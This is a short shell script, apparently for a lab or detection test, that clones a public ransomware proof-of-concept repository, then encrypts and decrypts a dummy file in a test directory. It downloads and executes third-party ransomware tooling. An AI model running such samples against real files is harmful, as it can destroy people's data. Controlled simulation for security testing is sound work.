#!/usr/bin/env sh

GREEN="\033[1;32m"
BLUE="\033[1;34m"
YELLOW="\033[1;33m"
RED="\033[1;31m"
RESET="\033[0m"

echo -e "${GREEN}[+] Installing dependencies for Ransomware-PoC...${RESET}"
# Ensure Python and pip are installed
apk add --no-cache python3 py3-pip git || echo -e "${RED}[!] Failed to install python3 and git${RESET}"

# Clone the Ransomware-PoC repository
echo -e "${GREEN}[+] Cloning Ransomware-PoC...${RESET}"
git clone https://github.com/jimmy-ly00/Ransomware-PoC || echo -e "${RED}[!] Failed to clone Ransomware-PoC${RESET}"

cd Ransomware-PoC
echo -e "${GREEN}[+] Installing pycryptodome for Ransomware-PoC${RESET}"
pip3 install pycryptodome || echo -e "${RED}[!] pycryptodome installation failed${RESET}"

# Create a test directory for ransomware simulation
TEST_DIR="/home/jimmy/test_ransomware"
mkdir -p $TEST_DIR
echo "Sensitive data for encryption test." > $TEST_DIR/sensitive_file.txt

# Run the ransomware PoC encryption
echo -e "${GREEN}[+] Executing Ransomware-PoC encryption...${RESET}"
python3 main_v2.py -p "$TEST_DIR" -e || echo -e "${RED}[!] Ransomware encryption failed${RESET}"

# (Optional) Decrypt after a delay to simulate full ransomware cycle
sleep 5
echo -e "${GREEN}[+] Executing Ransomware-PoC decryption...${RESET}"
python3 main_v2.py -p "$TEST_DIR" -d || echo -e "${RED}[!] Ransomware decryption failed${RESET}"

cd ..

# Clean up after test (optional)
rm -rf Ransomware-PoC